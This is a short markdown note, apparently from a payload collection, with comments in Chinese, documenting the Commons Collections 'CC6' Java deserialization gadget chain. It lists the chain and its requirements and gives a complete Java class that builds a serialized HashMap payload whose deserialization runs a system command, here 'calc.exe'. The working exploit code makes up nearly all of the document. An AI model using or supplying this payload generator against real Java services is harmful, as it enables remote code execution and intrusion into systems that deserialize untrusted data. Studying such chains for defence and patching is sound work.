# cc6-HashMap

## Gadget chain&Requires

```
#CC6适用于高版本java，在JDK8u71之后，sun.reflect.annotation.AnnotationInvocationHandler#readObject的逻辑导致之前的利用连都不可用，CC6也是ysoserial中比较通用的链子。
Gadget chain:
	ObjectInputStream.readObject()
		HashMap.readObject()
			HashMap.hash()
				TiedMapEntry.hashCode()
				TiedMapEntry.getValue()
					LazyMap.get()
						ChainedTransformer.transform()
							InvokerTransformer.transform()
								Method.invoke()
								Runtime.exec()
Require:
    commons-collections:commons-collections:3.1
    >=JDK8u71
```

## poc

```java
package com.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static Object getObject() throws IllegalAccessException, NoSuchFieldException {
        //构造LazyMap
        final String[] execArgs = new String[] { "calc.exe" };
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        //TiedMapEntry攻击链
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "lazykey");

        //hashMap攻击链
        HashMap expMap = new HashMap();
        expMap.put(tiedMapEntry,"1");
        lazyMap.remove("lazykey");

        //反射赋值
        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(transformerChain,transformers);

        return expMap;
    }
}

```

